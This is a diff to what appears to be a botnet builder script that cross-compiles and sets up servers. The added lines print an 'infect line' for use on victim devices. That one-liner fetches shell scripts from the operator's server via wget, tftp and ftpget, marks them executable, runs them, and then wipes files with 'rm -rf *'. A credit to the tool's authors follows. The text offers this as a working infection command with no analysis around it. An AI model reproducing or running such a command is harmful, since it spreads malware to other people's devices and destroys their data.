@@ -131,3 +131,6 @@ run("service httpd restart")
 run('echo "ulimit -n 99999" >> ~/.bashrc')
 
 print("\x1b[0;32mSuccessfully cross compiled and set up servers!\x1b[0m")
+print("\x1b[0;32mYour Infect Line: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
+print()
+print("\x1b[0;32mCoded by Void. Modified by n00dl3z.\x1b[0m")
